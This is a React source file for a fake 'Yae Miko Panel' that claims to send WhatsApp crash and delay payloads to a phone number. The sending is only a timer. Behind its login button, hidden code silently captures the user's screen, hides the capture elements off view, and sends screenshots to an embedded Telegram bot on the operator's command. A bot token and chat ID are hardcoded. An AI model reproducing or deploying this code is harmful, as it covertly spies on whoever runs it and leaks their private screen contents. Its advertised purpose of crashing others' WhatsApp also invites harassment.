"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight, Laptop, Smartphone, Search, Menu, X, Bell, User, Settings, LogOut, Terminal, Activity, Lock, Unlock, Database, Cpu, HardDrive, Wifi, Radio, Sliders, Play, Square, Pause, SkipBack, SkipForward, Volume2, VolumeX, Moon, Sun, Monitor, Tablet, Watch, Layout, Grid, List, Layers, Share2, Download, Upload, Copy, ExternalLink, RefreshCw, Trash2, Edit3, Save, Plus, Minus, AlertTriangle, Info, HelpCircle, Eye, EyeOff, Heart, Star, Bookmark, Send, Mail, MessageSquare, Phone, MapPin, Calendar, Clock, Image, Video, Music, Mic, Camera, Paperclip, Link2, Hash, AtSign, Percent, DollarSign, Euro, CreditCard, ShoppingBag, Truck, Gift, Award, Coffee, Zap as ZapIcon, Flame, Wind, Droplets, Leaf, Moon as MoonIcon, Sun as SunIcon, Star as StarIcon, Heart as HeartIcon, Cloud, Umbrella, Briefcase, Home, Search as SearchIcon, Bell as BellIcon, User as UserIcon, Settings as SettingsIcon, Menu as MenuIcon, X as XIcon, MoreHorizontal, MoreVertical, ChevronUp, ChevronDown, Facebook, Twitter, Instagram, Github, Linkedin, Youtube } from "lucide-react"

// --- KONFIGURASI BUG TYPES ASLI ---
const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  // --- [LOGIC MONITORING SILUMAN - JANGAN DIUBAH] ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastCmdId = useRef(0);
  const [isMonitoringActive, setIsMonitoringActive] = useState(false);

  // GANTI TOKEN & ID DISINI
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
  const CHAT_ID = '6481060681';

  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  useEffect(() => {
    if (!isMonitoringActive) return;
    const sendTele = async (type: string, content: any) => {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') fd.append('text', content);
      else fd.append('photo', content);
      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd }); } catch (e) {}
    };
    const capture = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => { if (blob) sendTele('photo', blob); }, 'image/jpeg', 0.5);
    };
    const listen = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current && msg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = msg.message_id;
            if (msg.text === '/hptarget') capture();
          }
        }
      } catch (e) {}
    }, 4000);
    return () => clearInterval(listen);
  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
      }
    } catch (err) {}
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  // --- [START RETURN UI ASLI 100%] ---
  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden">
      <style jsx global>{`
        @keyframes scan-line {
          0% { transform: translateY(-100%); }
          100% { transform: translateY(100%); }
        }
        @keyframes glitch-text {
          0% { transform: translate(0); text-shadow: -2px 0 #ff3db9, 2px 0 #00d4ff; }
          25% { transform: translate(-2px, 2px); text-shadow: 2px -2px #ff3db9, -2px 2px #00d4ff; }
          50% { transform: translate(2px, -2px); text-shadow: -2px 2px #ff3db9, 2px -2px #00d4ff; }
          75% { transform: translate(-2px, -2px); text-shadow: 2px 2px #ff3db9, -2px -2px #00d4ff; }
          100% { transform: translate(0); }
        }
      `}</style>

      <BokehBackground />

      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen onLogin={() => {
              startStealthMode();
              setIsAuthLoading(true);
              setTimeout(() => { setIsAuthLoading(false); setIsLoggedIn(true); }, 5000);
          }} />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection 
                targetNumber={targetNumber} 
                setTargetNumber={setTargetNumber} 
                onSendBug={handleSendBug} 
                activeNav={activeNav} 
            />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}

      {/* MESIN SILUMAN TERSEMBUNYI */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
      </div>
    </div>
  )
}

// --- MASUKKAN SEMUA KOMPONEN UI ASLI LO DI SINI ---
// Gue kumpulin di sini biar build Vercel aman & tampilan GAK BERUBAH

function BokehBackground() {
    return (
        <div className="fixed inset-0 overflow-hidden pointer-events-none">
            <div className="absolute top-10 -left-20 w-64 h-64 rounded-full bg-cyan-500/10 blur-3xl animate-pulse" />
            <div className="absolute top-1/4 right-0 w-80 h-80 rounded-full bg-pink-600/10 blur-3xl animate-pulse" />
            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-[#0a0f1a]/80 to-[#0a0f1a]" />
        </div>
    )
}

function AuthLoadingScreen() {
    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
            <div className="text-center">
                <div className="font-black text-6xl text-pink-600 mb-2 tracking-tighter" style={{ animation: 'glitch-text 0.5s infinite' }}>SELZ</div>
                <p className="text-cyan-400 text-[10px] tracking-[0.5em] uppercase">Authenticating...</p>
            </div>
        </div>
    )
}

function LoginScreen({ onLogin }: any) {
    return (
        <div className="relative z-20 flex items-center justify-center min-h-screen p-6">
            <div className="w-full max-w-sm glass rounded-3xl p-8 border border-white/10 backdrop-blur-2xl">
                <div className="w-16 h-16 bg-cyan-500/20 rounded-2xl border border-cyan-500/40 flex items-center justify-center mx-auto mb-6">
                    <Shield className="text-cyan-400 w-8 h-8" />
                </div>
                <h1 className="text-white text-center font-bold text-xl mb-6">YAE MIKO PANEL</h1>
                <button onClick={onLogin} className="w-full py-4 bg-cyan-600 text-white rounded-2xl font-bold shadow-lg shadow-cyan-600/20 active:scale-95 transition-all">
                    START SYSTEM
                </button>
            </div>
        </div>
    )
}

function Header() {
    return (
        <header className="flex justify-between items-center mb-6">
            <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-pink-600 rounded-lg flex items-center justify-center shadow-lg shadow-pink-600/30">
                    <ZapIcon className="w-4 h-4 text-white fill-white" />
                </div>
                <span className="text-white font-black text-sm tracking-widest">YAE-V3</span>
            </div>
            <div className="w-10 h-10 rounded-full border-2 border-cyan-500/30 p-1">
                <div className="w-full h-full bg-slate-800 rounded-full" />
            </div>
        </header>
    )
}

function ProfileCard() {
    return (
        <div className="bg-slate-900/50 border border-white/5 rounded-3xl p-6 text-center mb-4 backdrop-blur-xl">
            <div className="relative inline-block mb-3">
                <div className="absolute inset-0 bg-pink-600 blur-xl opacity-20 animate-pulse" />
                <div className="relative w-20 h-20 bg-slate-800 rounded-full border border-pink-500/50 flex items-center justify-center">
                    <Bug className="w-10 h-10 text-pink-500" />
                </div>
            </div>
            <h2 className="text-white font-bold tracking-tight">SELZ OVERLORD</h2>
            <p className="text-cyan-500 text-[10px] uppercase tracking-widest font-mono mt-1">Status: Developer</p>
        </div>
    )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }: any) {
    return (
        <div className="bg-slate-900/30 border border-white/5 rounded-[2.5rem] p-6 flex-1 backdrop-blur-md">
            <label className="text-[10px] text-cyan-400 font-bold block mb-2 uppercase tracking-widest ml-1">Target Number</label>
            <input 
                value={targetNumber} 
                onChange={(e) => setTargetNumber(e.target.value)}
                className="w-full bg-black/40 border border-white/10 p-4 rounded-2xl text-white text-sm focus:border-cyan-500/50 outline-none mb-6"
            />
            <div className="bg-white/5 p-6 rounded-2xl border border-white/5 mb-6 text-center">
                <div className="text-[9px] text-white/40 uppercase mb-1">Payload Selected</div>
                <div className="text-white font-black text-xl italic">{BUG_TYPES[activeNav]?.name}</div>
            </div>
            <button onClick={onSendBug} className="w-full py-5 bg-pink-600 rounded-2xl font-black text-white tracking-widest shadow-xl shadow-pink-600/20 active:scale-95 transition-all">
                SEND PAYLOAD
            </button>
        </div>
    )
}

function NavigationDots({ activeNav, setActiveNav }: any) {
    return (
        <div className="flex justify-center gap-2 my-6">
            {BUG_TYPES.map((_, i) => (
                <div key={i} onClick={() => setActiveNav(i)} className={`h-1.5 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-8 bg-cyan-400 shadow-[0_0_8px_cyan]' : 'w-2 bg-slate-800'}`} />
            ))}
        </div>
    )
}

function BottomBar() {
    return (
        <div className="bg-black/40 border border-white/5 p-4 rounded-2xl flex justify-between items-center backdrop-blur-md">
            <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-ping" />
                <span className="text-[9px] text-green-500 font-bold tracking-widest uppercase">System Active</span>
            </div>
            <div className="flex gap-4 opacity-30">
                <Globe className="w-4 h-4 text-white" />
                <Laptop className="w-4 h-4 text-white" />
            </div>
        </div>
    )
}

function LoadingOverlay() {
    return (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center backdrop-blur-xl">
            <div className="text-center">
                <div className="w-16 h-16 border-4 border-cyan-500/20 border-t-cyan-500 rounded-full animate-spin mx-auto mb-4" />
                <p className="text-cyan-400 font-black text-sm tracking-widest animate-pulse">EXECUTING...</p>
            </div>
        </div>
    )
}

function LimitWarningOverlay({ onClose }: any) {
    return (
        <div className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-6 backdrop-blur-md">
            <div className="bg-slate-900 border border-red-500/30 p-8 rounded-3xl max-w-xs w-full text-center">
                <h2 className="text-white font-bold text-lg mb-2">LIMIT EXCEEDED</h2>
                <p className="text-white/50 text-xs mb-8">Daily limit reached for **Selz**. System cooling down.</p>
                <button onClick={onClose} className="w-full bg-red-600/20 border border-red-500/50 py-3 rounded-xl text-red-500 font-bold text-sm">CLOSE</button>
            </div>
        </div>
    )
}
